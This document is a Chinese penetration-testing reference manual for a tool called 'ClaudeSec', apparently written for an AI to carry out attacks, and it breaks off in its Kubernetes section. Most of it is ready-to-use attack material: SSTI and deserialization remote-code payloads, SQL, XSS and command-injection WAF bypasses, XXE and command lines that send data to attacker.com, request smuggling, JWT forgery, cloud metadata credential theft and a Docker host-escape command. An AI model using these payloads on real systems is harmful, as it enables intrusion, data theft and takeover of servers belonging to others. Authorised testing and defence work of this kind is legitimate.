# ClaudeSec — 技术参考手册 v2.1

> 版本: 2.1.0 | 更新: 2026-05-28 | 分类: 渗透测试技术文档
> 框架对齐: PTES v2.0 / OWASP Testing Guide v4.2 / NIST SP 800-115 / MITRE ATT&CK v13

---

## 目录

- [1. MITRE ATT&CK 映射](#1-mitre-attck-映射)
- [2. 信息收集进阶技术](#2-信息收集进阶技术)
- [3. 漏洞检测技术矩阵](#3-漏洞检测技术矩阵)
- [4. API 安全测试](#4-api-安全测试)
- [5. Payload 大全](#5-payload-大全)
- [6. 现代攻击技术](#6-现代攻击技术)
- [7. WAF 绕过技术](#7-waf-绕过技术)
- [8. 工具参数速查](#8-工具参数速查)
- [9. 检测规则库](#9-检测规则库)
- [10. 云服务安全测试](#10-云服务安全测试)
- [11. 容器安全测试](#11-容器安全测试)
- [12. 常见端口与服务速查](#12-常见端口与服务速查)

---

## 1. MITRE ATT&CK 映射

将 ClaudeSec 命令映射至 MITRE ATT&CK 企业版 v13 技术矩阵：

### 侦察 (Reconnaissance)

| ClaudeSec 命令 | ATT&CK 技术 ID | 技术名称 |
|---------------|----------------|---------|
| `/recon` | T1595 | Active Scanning |
| `/recon` Phase 1 | T1596 | Search Open Technical Databases |
| `/recon` Phase 2 | T1595.001 | Scanning IP Blocks |
| `/subs` | T1597 | Search Closed Sources |
| `/check` single URL | T1595.002 | Vulnerability Scanning |

### 资源开发 (Resource Development)

| ClaudeSec 命令 | ATT&CK 技术 ID | 技术名称 |
|---------------|----------------|---------|
| `/exploit` | T1588 | Obtain Capabilities |
| `/bypass` | T1588.002 | Tool |

### 初始访问 (Initial Access)

| 检测类别 | ATT&CK 技术 ID | 技术名称 |
|---------|----------------|---------|
| SQL Injection | T1190 | Exploit Public-Facing Application |
| SSRF | T1190 | Exploit Public-Facing Application |
| LFI/RFI | T1190 | Exploit Public-Facing Application |
| Command Injection | T1190 | Exploit Public-Facing Application |
| File Upload | T1190 | Exploit Public-Facing Application |

### 执行 (Execution)

| 检测类别 | ATT&CK 技术 ID | 技术名称 |
|---------|----------------|---------|
| SSTI → RCE | T1203 | Exploitation for Client Execution |
| LFI → Log Poisoning | T1059 | Command and Scripting Interpreter |
| SQLi → xp_cmdshell | T1059.003 | Windows Command Shell |

### 持久化 (Persistence)

| 检测类别 | ATT&CK 技术 ID | 技术名称 |
|---------|----------------|---------|
| Web Shell Upload | T1505.003 | Web Shell |
| JWT Forgery | T1525 | Implant Internal Image |

### 防御规避 (Defense Evasion)

| 检测类别 | ATT&CK 技术 ID | 技术名称 |
|---------|----------------|---------|
| WAF Bypass | T1562.001 | Impair Defenses: Disable or Modify Tools |
| Character Encoding | T1027 | Obfuscated Files or Information |

### 凭证访问 (Credential Access)

| 检测类别 | ATT&CK 技术 ID | 技术名称 |
|---------|----------------|---------|
| .env / config leak | T1552.001 | Credentials in Files |
| JS hardcoded keys | T1552.004 | Private Keys |
| SQLi → DB creds | T1555 | Credentials from Password Stores |

### 发现 (Discovery)

| 检测类别 | ATT&CK 技术 ID | 技术名称 |
|---------|----------------|---------|
| Port Scanning | T1046 | Network Service Discovery |
| Directory Enum | T1040 | Network Share Discovery |
| Fingerprinting | T1082 | System Information Discovery |

---

## 2. 信息收集进阶技术

### 2.1 子域名深度枚举

```bash
# 多源聚合枚举
subfinder -d example.com -all -recursive -o subs_raw.txt

# 证书透明度日志
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u >> subs.txt

# DNS 聚合器
curl -s "https://rapiddns.io/subdomain/example.com?full=1" | grep -oP '([a-zA-Z0-9._-]+\.example\.com)' | sort -u >> subs.txt

# 搜索引擎 (Google Dork via API)
site:example.com -www -mail -mx

# 去重 + 探活
cat subs_*.txt | sort -u | httpx -silent -status-code -title -tech-detect -o live_hosts.txt
```

### 2.2 CDN 真实 IP 溯源矩阵

| 方法 | 命令 | 成功率 | 适用场景 |
|------|------|--------|---------|
| 历史 DNS | `securitytrails.com/domain/example.com/history/a` | 中 | 已切换 CDN |
| SSL 证书 | `crt.sh/?q=%25.example.com` 提取 IP | 高 | 共享证书 |
| 子域名探测 | 找非 CDN 子站 (mail, ftp, dev) | 高 | 大部分情况 |
| F5 解码 | Cookie `BIGipServer` 解码 | 低 | 仅 F5 负载均衡 |
| DNS 枚举 | `dnsdumpster.com` | 中 | 辅助验证 |
| 邮件头分析 | 发送邮件检查原始 IP | 高 | 有邮件服务器 |
| Favicon Hash | `shodan.io` 搜索 favicon hash | 中 | Shodan 会员 |

```python
# F5 BIG-IP Cookie 解码 (BIGipServer=)
import struct
import socket

cookie = "988074106.47873.0000"
# 拆解格式: host:port.encoded.unknown
encoded = int(cookie.split(".")[0])
ip_parts = [
    (encoded >> 24) & 0xFF,
    (encoded >> 16) & 0xFF,
    (encoded >> 8) & 0xFF,
    encoded & 0xFF
]
ip = ".".join(str(p) for p in ip_parts)
print(f"Real IP: {ip}")
```

### 2.3 深度 Google Dork 查询

```text
# 敏感文件泄露
site:example.com ext:sql | ext:bak | ext:swp | ext:env | ext:conf
site:example.com intitle:"index of" "parent directory" +"backup"
site:example.com filetype:log "password" | "username"

# 暴露的 Web 入口
site:example.com inurl:phpMyAdmin | inurl:adminer | inurl:mysql
site:example.com intitle:"WAMPP" | "XAMPP" | "MAMP" | "LAMP"

# API 和调试接口
site:example.com inurl:api | inurl:rest | inurl:graphql
site:example.com intext:"swagger" | intext:"openapi" | intext:"api-docs"
site:example.com inurl:"?debug" | inurl:"?test" | inurl:"?dev"

# 配置管理系统
site:example.com intitle:"Jenkins" | "GitLab" | "Kibana" | "Prometheus"
site:example.com intitle:"phpinfo()" | "PHP Version"

# AWS S3 泄露
site:s3.amazonaws.com "example.com"
site:amazonaws.com "example" "s3"
```

### 2.4 JavaScript 深度分析管道

```bash
# 1. 全量 JS 提取
echo https://example.com | hakrawler -js -depth 3 | grep "\.js$" | sort -u | anew js_urls.txt

# 2. 批量下载并分析
cat js_urls.txt | while read url; do
    echo "=== $url ==="
    curl -s "$url" | \
    grep -oP '"[A-Za-z0-9_/\-{}.:?&=#\[\]]*"' | \
    grep -v '\.js\|\.css\|\.png\|\.jpg\|\.svg\|\.woff' | \
    sort -u | head -50
done > endpoints.txt

# 3. gf 模式扫描
cat js_urls.txt | xargs -I{} sh -c 'curl -s "{}"' > all_js.txt
gf aws-keys all_js.txt
gf s3-buckets all_js.txt
gf secrets all_js.txt
gf base64 all_js.txt
gf debug-pages all_js.txt
gf upload-fields all_js.txt

# 4. 手动正则
grep -oP '(?<=apiKey["\s:=]+["\'])[^"\']+' all_js.txt
grep -oP 'AKIA[0-9A-Z]{16}' all_js.txt
grep -oP 'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}' all_js.txt
```

### 2.5 基于 favicon 的资产发现

```bash
# 获取 favicon hash 并在 Shodan/Fofa 搜索
curl -s https://target.com/favicon.ico | python3 -c "
import sys, mmh3, codecs
data = sys.stdin.buffer.read()
print(f'avoid: {mmh3.hash(data)}')
print(f'mmh3: {hex(mmh3.hash(data))}')
" 2>/dev/null || echo "Need: pip3 install mmh3"

# 输出示例: mmh3: -334360040
# 在 Shodan 搜索: http.favicon.hash:-334360040
# 在 Fofa 搜索: icon_hash=-334360040
```

---

## 3. 漏洞检测技术矩阵

### 3.1 SQL 注入技术矩阵

```python
# 完整检测向量和预期响应
SQLI_MATRIX = {
    "MySQL": {
        "error_indicators": [
            "SQL syntax.*MySQL",
            "Warning.*mysql_.*",
            "MySQLSyntaxErrorException",
            "valid MySQL result",
            "check the manual that corresponds to your MySQL server",
             "MySqli_",
        ],
        "time_payload": "SLEEP({n})",
        "version_query": "SELECT @@version",
        "comment": ["-- ", "#", "/*", "-- -"],
        "stacked": True,
    },
    "MSSQL": {
        "error_indicators": [
            "Unclosed quotation mark",
            "Microsoft OLE DB",
            "ODBC SQL Server Driver",
            "Microsoft.*SQL Server",
            "Line *",
        ],
        "time_payload": "WAITFOR DELAY '0:0:{n}'",
        "version_query": "SELECT @@version",
        "comment": ["--", "/*"],
        "stacked": True,
        "special": ["xp_cmdshell", "OPENROWSET", "xp_dirtree"],
    },
    "Oracle": {
        "error_indicators": [
            "ORA-[0-9]{5}",
            "Oracle.*Driver",
            "oracle\.jdbc",
            "quoted string not properly terminated",
        ],
        "time_payload": "DBMS_PIPE.RECEIVE_MESSAGE('a',{n})",
        "version_query": "SELECT banner FROM v$version",
        "comment": ["--"],
        "stacked": False,
        "special": ["utl_http", "utl_file", "ctxsys.drithsx.sn"],
    },
    "PostgreSQL": {
        "error_indicators": [
            "PostgreSQL.*ERROR",
            "pg_query\(\)",
            "psql error",
            "ERROR:.{0,100}PG::",
        ],
        "time_payload": "pg_sleep({n})",
        "version_query": "SELECT version()",
        "comment": ["--", "/*"],
        "stacked": True,
        "special": ["pg_read_file", "COPY ... FROM PROGRAM"],
    },
    "SQLite": {
        "error_indicators": [
            "SQLite/JDBCDriver",
            "SQLite\.Exception",
            "sqlite3\.OperationalError",
            "unrecognized token",
        ],
        "time_payload": "randomblob(100000000)",  # 近似延迟
        "version_query": "SELECT sqlite_version()",
        "comment": ["--"],
        "stacked": False,
    },
}
```

### 3.2 SQL 注入自动验证流程

```python
# AI 执行的判定逻辑
def verify_sqli(url, param):
    # 1. 基线请求
    baseline = send_request(url, {param: "1"})
    
    # 2. 真值测试
    true_resp = send_request(url, {param: "1' AND '1'='1"})
    
    # 3. 假值测试
    false_resp = send_request(url, {param: "1' AND '1'='2"})
    
    # 4. 时间盲注
    start = timer()
    time_resp = send_request(url, {param: "1' AND SLEEP(3)-- -"})
    elapsed = timer() - start
    
    # 判定
    if elapsed >= 3:
        return CONFIRMED("Time-based SQL injection")
    if true_resp.content != false_resp.content:
        return CONFIRMED("Boolean-based SQL injection")
    if error_pattern.match(false_resp.text):
        return CONFIRMED(f"Error-based SQL injection: {detect_db(false_resp.text)}")
    
    return NOT_CONFIRMED("Potential but needs manual verification")
```

### 3.3 XSS 上下文检测矩阵

| 上下文 | 测试 Payload | 成功特征 | WAF 绕过 |
|--------|-------------|---------|---------|
| HTML 标签间 | `<script>alert(1)</script>` | Payload 原样渲染 | `<svg/onload=alert(1)>` |
| HTML 属性 | `" onfocus=alert(1) autofocus="` | 属性断裂, 事件触发 | `"onfocus=alert` 省略空格 |
| JavaScript 字符串 | `';alert(1);//` | 语法逃逸 | `\';alert(1);//` |
| JavaScript 模板 | `${alert(1)}` | 模板注入 | `#{alert(1)}` |
| CSS 上下文 | `</style><script>alert(1)</script>` | 样式中断 | `</style><svg/onload=alert(1)>` |
| URL 参数 | `javascript:alert(1)` | href/src 触发 | `java%0d%0ascript:alert(1)` |
| Angular 模板 | `{{constructor.constructor('alert(1)')()}}` | Angular 沙箱逃逸 | `{$on.constructor('alert(1)')()}` |

### 3.4 SSTI 完整检测表

| 引擎 | 语言 | 检测字符串 | 识别特征 | RCE Payload |
|------|------|-----------|---------|------------|
| Jinja2 | Python | `{{7*7}}` | `49` | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Twig | PHP | `{{7*7}}` | `49` | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Freemarker | Java | `${7*7}` | `49` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity | Java | `#set($x=7*7)$x` | `49` | `#set($x='')+#set($rt=$x.class.forName('java.lang.Runtime'))+#set($chr=$x.class.forName('java.lang.Character'))+#set($str=$x.class.forName('java.lang.String'))+#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end` |
| JSP EL | Java | `${7*7}` | `49` | `${Runtime.getRuntime().exec('id')}` |
| Thymeleaf | Java | `[[${7*7}]]` | `49` | `[[${#runtime.exec('id')}]]` |
| Mako | Python | `${7*7}` | `49` | `${self.module.cache.util.os.popen('id').read()}` |
| Smarty | PHP | `{$smarty.now}` | 时间戳 | `{system('id')}` |
| ERB | Ruby | `<%= 7*7 %>` | `49` | `<%= system('id') %>` |
| Nunjucks | Node | `{{7*7}}` | `49` | `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}` |

---

## 4. API 安全测试

### 4.1 REST API 测试清单

```yaml
认证测试:
  - 未认证访问: 移除 Authorization header 请求
  - Token 泄露: URL/Header/Body/Cookie 中的 Token
  - 弱 Token: JWT 弱密钥爆破, 静态 Token
  - 速率限制: 50+ 连续请求测试

授权测试:
  - IDOR: 遍历 user_id, order_id, document_id
  - 越权: 低权限用户访问高权限接口
  - 批量分配: 额外字段注入 (role:admin, is_admin:true)

输入验证:
  - SQL 注入: 所有参数尝试注入
  - NoSQL 注入: MongoDB $where, $gt, $ne
  - 命令注入: 文件路径、 shell 参数
  - XXE: XML 外部实体注入
  - 类型混淆: 字符串 vs 数字 vs null vs 数组

输出验证:
  - 敏感数据: 响应中的密码、Token、PII
  - 信息泄露: 堆栈跟踪、调试信息、SQL 查询
  - 枚举: 错误信息差异判断有效/无效

速率限制:
  - IP 限制: X-Forwarded-For 绕过
  - Token 限制: 多 Token 轮换
  - 时间窗口: 分布式请求避开窗口

请求方法:
  - HTTP 方法混淆: GET/POST/PUT/DELETE/PATCH/OPTIONS
  - 内容类型混淆: JSON/XML/Form 互相转换
  - 重复参数: ?id=1&id=2 服务器处理方式
```

### 4.2 GraphQL 安全测试

```graphql
# 1. Introspection 查询
query {
  __schema {
    types {
      name
      fields { name type { name } }
    }
  }
}

# 2. 批量查询 (DoS)
query {
  a: __typename
  b: __typename
  # ... 重复 10000 次
}

# 3. 深度递归查询 (DoS)
query {
  user {
    posts { user { posts { user { name } } } }
  }
}

# 4. SQL 注入
query {
  user(id: "1' OR '1'='1") { name email }
}

# 5. IDOR
query {
  user(id: 2) { email privateData }
}
```

### 4.3 WebSocket 测试

```bash
# 使用 wscat 测试
wscat -c wss://target.com/ws

# 注入测试
> {"action":"subscribe","channel":"admin_notifications"}
> {"message":"<script>alert(1)</script>"}
> {"user_id":"1' OR '1'='1"}

# 跨域 WebSocket (CSWSH)
# 检查 Origin 头验证
```

---

## 5. Payload 大全

### 5.1 NoSQL 注入 (MongoDB)

```json
// 认证绕过
{ "username": "admin", "password": { "$gt": "" } }
{ "username": { "$gt": "" }, "password": { "$gt": "" } }
{ "username": "admin", "password": { "$ne": "" } }
{ "$where": "sleep(5000)" }

// 注入参数
username[$ne]=admin&password[$ne]=test
username[$regex]=.*&password[$regex]=.*
```

### 5.2 LDAP 注入

```text
# 认证绕过
admin*
admin)(&)
admin)(&(password=test)
*)(uid=*

# 信息泄露
(&(uid=admin)(userPassword=*))
(&(uid=*)(userPassword=test))
(|(uid=*)(cn=admin))
```

### 5.3 XPath 注入

```text
' or '1'='1
' and '1'='2
' and count(//user/*)>0 and '1'='1
' and substring(//user[1]/username,1,1)='a' and '1'='1
```

### 5.4 命令注入绕过矩阵

```text
# 空格过滤绕过
${IFS}              → cat${IFS}/etc/passwd
{ls,-la}            → 花括号逗号分隔
%09                 → Tab
%0a                 → 换行

# 关键字过滤绕过
c''at /etc/passwd   → 单引号分隔
c""at /etc/passwd   → 双引号分隔
c\at /etc/passwd    → 反斜杠
/???/???            → 通配符 (/bin/cat)
/???/c?t /???/p??ss??d → 字符通配

# 编码执行
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
$@|bash             → 环境变量
$(<compress>)       → process substitution

# 无回显利用
curl http://attacker.com/$(whoami)
nslookup $(cat /etc/hostname).attacker.com
ping -c 1 `whoami`.attacker.com
```

### 5.5 XXE 注入

```xml
<!-- 基本文件读取 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF 探测 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- 带外数据泄露 (OOB XXE) -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % callhome SYSTEM "http://attacker.com/?data=%xxe;">
  %callhome;
]>
<root>test</root>

<!-- 错误信息泄露 PHP -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

### 5.6 HTTP Request Smuggling

```text
# CL.TE (Content-Length / Transfer-Encoding)
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X:

# TE.CL
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST
0

# TE.TE (混淆 Transfer-Encoding)
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
```

---

## 6. 现代攻击技术

### 6.1 竞争条件攻击

```bash
# 并行请求利用 race condition
# 场景: 优惠券多次使用、提现多次处理

# 使用 curl 并行
for i in {1..50}; do
    curl -s "https://target.com/api/coupon/redeem?code=DISCOUNT50" &
done
wait

# 使用 Turbo Intruder (Burp Suite)
# 或 Python asyncio
python3 << 'EOF'
import asyncio
import aiohttp

async def redeem(session, url):
    async with session.post(url) as resp:
        return await resp.text()

async def main():
    url = "https://target.com/api/coupon/redeem?code=DISCOUNT50"
    async with aiohttp.ClientSession() as session:
        tasks = [redeem(session, url) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        successes = [r for r in results if '"success":true' in r]
        print(f"Success rate: {len(successes)}/50")

asyncio.run(main())
EOF
```

### 6.2 JWT 高级攻击

```bash
# 1. 算法混淆 (RS256 → HS256)
# 获取服务器的公钥 (常见: jwks.json, /.well-known/jwks.json)
curl https://target.com/.well-known/jwks.json

# 用公钥作为 HMAC 密钥签名
python3 jwt_tool.py <JWT> -X misCrack -I -pc "role" -pv "admin"

# 2. kid 注入
# header: {"kid": "../../../../dev/null"}

# 3. JKU 注入
# header: {"jku": "https://attacker.com/jwks.json"}

# 4. 空签名算法
# header: {"alg": "none"}
# 直接去掉签名部分

# 5. 弱密钥爆破
python3 jwt_tool.py <JWT> -C -d rockyou.txt
```

### 6.3 反序列化攻击

```java
// Java 反序列化 (ysoserial)
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/$(whoami)' | base64

// PHP 反序列化
class Example { public $cmd = 'system("id");'; }
echo serialize(new Example());
// O:7:"Example":1:{s:3:"cmd";s:14:"system("id");";}

// Python pickle
python3 -c "
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
"
```

### 6.4 HTTP Parameter Pollution

```text
# 重复参数解析差异
?user_id=1&user_id=2       # PHP: 2, ASP: 1,2, Python: ['1','2']
?debug=true&debug=false    # PHP: false, ASP: true,false

# HPP 利用
# 如果后端用第一个值且 SQL 拼接:
/user?id=1 OR 1=1--&id=1   # WAF 检测第二个, 后端用第一个
```

---

## 7. WAF 绕过技术

### 7.1 WAF 指纹与特征

| WAF 产品 | 厂商 | 识别头/Cookie | 旁路技巧 |
|----------|------|--------------|---------|
| Cloudflare | Cloudflare | `cf-ray`, `__cfduid` | 源站 IP 发现、HTTP/2 降级 |
| AWS WAF | Amazon | `x-amz-rid`, `x-amzn-RequestId` | Content-Type 混淆、大小写 |
| ModSecurity | Trustwave | `Mod_Security` header | 请求体编码、分块传输 |
| Akamai | Akamai | `AkamaiGHost` | 真实 IP 发现、HTTP/2 过度 |
| F5 BIG-IP | F5 | `BIGipServer` cookie | 路径规范化、编码绕过 |
| SafeLine | 长亭科技 | 错误页面特征 | HTTP 方法混淆 |
| Alibaba Cloud | 阿里云 | `aliyungf_t` | 参数编码、条件竞争 |
| Imperva | Imperva | `incap_ses`, `visid_incap` | POST → GET 转换 |

### 7.2 SQL 注入 WAF 绕过矩阵

```sql
-- 1. 注释绕过
SELECT/**/*/**/FROM/**/users
UN/**/ION SE/**/LECT 1,2,3
/*!UNION*/ /*!SELECT*/ 1,2,3

-- 2. 空白字符替换
%09 → Tab
%0A → Newline
%0C → Form Feed
%0D → Carriage Return
%0A%09 → 组合

-- 3. 操作符替换
1=1 → 1 LIKE 1 → 1 BETWEEN 0 AND 2 → 1 IN (0,1) → 1<>0
AND → && (URL encode: %26%26)
OR  → || (URL encode: %7C%7C)

-- 4. 字符串混淆
'sleep(5)' → 'sle'||'ep(5)'
'sleep(5)' → CHAR(115,108,101,101,112,40,53,41)

-- 5. 大小写混合
UnIoN SeLeCt 1,2,3
union select 1,2,3

-- 6. 双重/三重编码
%27 → %2527 → %252527 (% → %25)
' OR '1'='1 → %2527%2520OR%2520%25271%2527%253D%25271

-- 7. HTTP 参数污染
?id=1&id=1'&id=UNION&id=SELECT&id=1,2,3

-- 8. 分块传输 (Chunked)
POST / HTTP/1.1
Transfer-Encoding: chunked

1
'
68
 OR '1'='1 UNION SELECT 1,2,3--
0

-- 9. 请求方法转换
GET → POST → PUT → OPTIONS → PATCH
```

### 7.3 XSS WAF 绕过矩阵

```html
<!-- 1. 编码绕过 -->
%3Cscript%3Ealert(1)%3C/script%3E          <!-- URL 编码 -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E; <!-- HTML 实体 -->
\x3Cscript\x3Ealert(1)\x3C/script\x3E       <!-- Hex 编码 -->

<!-- 2. 脚本执行上下文 -->
<iframe srcdoc="<script>alert(1)</script>">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">

<!-- 3. 事件处理器绕过 -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- 4. SVG 向量 -->
<svg><script>alert(1)
<svg onload=alert(1)>
<svg><use href="//attacker.com/evil.svg#x"/>

<!-- 5. 无括号执行 -->
<script>alert`1`</script>
<script>setTimeout`alert\x261`</script>
<script>location=atob('amF2YXNjcmlwdDphbGVydCgxKQ==')</script>

<!-- 6. DOM 型 XSS 特殊向量 -->
javascript:alert(1) - in href
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

<!-- 7. 服务端渲染框架 (Vue/React) -->
{{__proto__[alert][1]}}         <!-- Vue 模板注入 -->
{/*<script>alert(1)</script>*/}  <!-- React JSX -->
```

---

## 8. 工具参数速查

### 8.1 nmap 高级用法

```bash
# 完整安全扫描
nmap -sS -sV -sC -O --traceroute --script=vuln,discovery,auth <target>

# 规避检测
nmap -sS -sA -Pn -D RND:15 --spoof-mac 0 --source-port 53 -f <target>

# SMB 枚举
nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-vuln-* <target>

# HTTP 枚举
nmap -p 80,443 --script=http-enum,http-headers,http-methods,http-title <target>

# 数据库审计
nmap -p 3306 --script=mysql-audit,mysql-databases,mysql-users,mysql-vuln* <target>

# SSL/TLS 审计
nmap --script=ssl-enum-ciphers,ssl-cert,ssl-heartbleed -p 443 <target>
```

### 8.2 ffuf 高级用法

```bash
# 多字典联合扫描
ffuf -u https://target.com/FUZZ -w dirs.txt -e .php,.asp,.aspx,.jsp,.do,.action

# 递归扫描 + 文件扩展名
ffuf -u https://target.com/FUZZ -w dirs.txt -recursion -recursion-depth 3 -e .php

# POST 参数 fuzz
ffuf -u https://target.com/login -X POST \
  -d "username=admin&password=FUZZ&csrf=FUZZ2" \
  -w passwords.txt:FUZZ -w csrf_tokens.txt:FUZZ2 -H "Cookie: session=xxx"

# 请求头 fuzzing
ffuf -u https://target.com/ \
  -H "X-Forwarded-For: FUZZ" -H "X-Real-IP: FUZZ" \
  -w ips.txt -fc 200,301,302

# 值爆破 (IDOR)
ffuf -u https://target.com/api/user/FUZZ -w ids.txt -fs 404

# 子域名枚举 (配合 hosts 文件)
ffuf -u https://FUZZ.target.com -w subdomains.txt -c
```

### 8.3 nuclei 模板扫描

```bash
# 全模板扫描
nuclei -u https://target.com -severity critical,high,medium -o vulns.txt

# 按标签筛选
nuclei -u https://target.com -tags cve,rce,sqli,lfi

# 按分类
nuclei -u https://target.com -type ssl,dns,http

# 自定模板
nuclei -u https://target.com -t custom-templates/

# 速率控制
nuclei -u https://target.com -rate-limit 50 -bulk-size 10
```

### 8.4 curl 等价的工具操作

```bash
# 测试方法覆盖
curl -X OPTIONS https://target.com/api -v

# 自定义 Cookie/Header
curl -b "session=abc123" -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin

# 跟随重定向
curl -L -v https://target.com

# 只看响应头
curl -I https://target.com

# 忽略证书错误
curl -k https://target.com

# 设置 User-Agent
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" https://target.com
```

---

## 9. 检测规则库

### 9.1 完整敏感路径字典

```text
# 配置文件
/.env
/.env.production
/.env.dev
/.env.staging
/config/
/config.php
/config.php.bak
/config.inc
/config.inc.php
/db.config
/database.yml
/database.json
/application.properties
/app.config
/web.config
/web.config.bak
/settings.py
/settings.php
/wp-config.php
/wp-config.php.bak
/config.json
/config.xml

# 版本控制系统
/.git/
/.git/config
/.git/HEAD
/.git/index
/.svn/
/.svn/entries
/.svn/wc.db
/.hg/
/.hg/store
/BitKeeper/
/.bzr/

# API 文档
/swagger/
/swagger-ui/
/swagger-ui.html
/swagger-resources
/v2/swagger.json
/v1/swagger.json
/v3/api-docs
/openapi.json
/api-docs
/api/docs
/api/swagger
/graphql
/graphiql
/rest-api/

# 管理接口
/admin/
/admin.php
/administrator/
/manager/
/management/
/dashboard/
/portal/
/console/
/backend/
/cp/
/panel/

# 备份文件
/*.bak
/*.old
/*.orig
/*.backup
/*.swp
/*.swo
/*.swn
/backup/
/backups/
/db.sql
/dump.sql
/export.sql
/www.zip
/www.tar.gz
/source.zip
/source.tar.gz
/web.rar
/site.zip

# 其他
/phpinfo.php
/info.php
/test.php
/debug/
/debug.php
/.DS_Store
/Thumbs.db
/crossdomain.xml
/clientaccesspolicy.xml
/robots.txt
/sitemap.xml
```

### 9.2 HTTP 安全头检查

```python
SECURITY_HEADERS = {
    # 严格评分 (缺失扣分严重)
    "Strict-Transport-Security": {
        "expected": "max-age=31536000; includeSubDomains",
        "severity": "MEDIUM",
        "description": "HSTS enforces HTTPS, preventing SSL stripping attacks"
    },
    "Content-Security-Policy": {
        "expected": "default-src 'self'",
        "severity": "MEDIUM",
        "description": "CSP mitigates XSS and data injection attacks"
    },
    "X-Content-Type-Options": {
        "expected": "nosniff",
        "severity": "LOW",
        "description": "Prevents MIME type sniffing"
    },
    "X-Frame-Options": {
        "expected": "DENY or SAMEORIGIN",
        "severity": "MEDIUM",
        "description": "Prevents clickjacking attacks"
    },
    "X-XSS-Protection": {
        "expected": "1; mode=block",
        "severity": "LOW",
        "description": "Enables browser XSS filter"
    },
    "Referrer-Policy": {
        "expected": "strict-origin-when-cross-origin",
        "severity": "LOW",
        "description": "Controls referrer header information disclosure"
    },
    "Permissions-Policy": {
        "expected": "camera=(), microphone=(), geolocation=()",
        "severity": "LOW",
        "description": "Restricts browser API access"
    },
}

COOKIE_FLAGS = {
    "HttpOnly": "Missing HttpOnly flag — cookie accessible via JavaScript",
    "Secure": "Missing Secure flag — cookie sent over unencrypted HTTP",
    "SameSite": "Missing SameSite flag — vulnerable to CSRF",
}
```

### 9.3 CORS 检测

```bash
# 基础测试
curl -H "Origin: https://evil.com" -I https://target.com/api
curl -H "Origin: null" -I https://target.com/api
curl -H "Origin: https://target.com.evil.com" -I https://target.com/api

# 带凭证测试
curl -H "Origin: https://evil.com" -H "Cookie: session=abc" -I https://target.com/api

# 期望不安全响应:
Access-Control-Allow-Origin: https://evil.com      # 任意 Origin 反射
Access-Control-Allow-Origin: null                    # null Origin 允许
Access-Control-Allow-Credentials: true               # 带凭证跨域
Access-Control-Allow-Origin: *                       # 通配符 (不与 Credentials 同时)
```

---

## 10. 云服务安全测试

### 10.1 AWS S3 测试

```bash
# 枚举 S3 Bucket
s3-buckets.txt 中包含常见命名: target, target-backup, target-dev, target-assets, target-static

for bucket in $(cat s3-names.txt); do
    # List Bucket
    curl -s "https://${bucket}.s3.amazonaws.com/" | head -20
    
    # Bucket ACL
    curl -s "https://${bucket}.s3.amazonaws.com/?acl"
    
    # 使用 awscli
    aws s3 ls s3://${bucket} --no-sign-request 2>/dev/null && echo "PUBLIC: ${bucket}"
done
```

### 10.2 云元数据 API 测试

```bash
# AWS
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/user-data/

# GCP
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Azure
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 阿里云
curl -s http://100.100.100.200/latest/meta-data/
curl -s http://100.100.100.200/latest/user-data/

# 腾讯云
curl -s http://metadata.tencentyun.com/latest/meta-data/

# 华为云
curl -s http://169.254.169.254/openstack/latest/
```

---

## 11. 容器安全测试

### 11.1 Docker API 未授权

```bash
# Docker Remote API 测试
curl -s http://target.com:2375/version
curl -s http://target.com:2375/containers/json
curl -s http://target.com:2375/images/json

# 如果未授权, 可以执行命令
# 创建容器执行命令
docker -H tcp://target.com:2375 run --rm -it alpine sh

# 挂载宿主机文件系统
docker -H tcp://target.com:2375 run -v /:/mnt alpine chroot /mnt sh
```

### 11.2 Kubernetes API 测试

```bash
# K8s API Server 默认端口 6443
curl -sk https://target.com:6443/api/v1/pods
curl -sk https://target.com:6443/api/v1/secrets
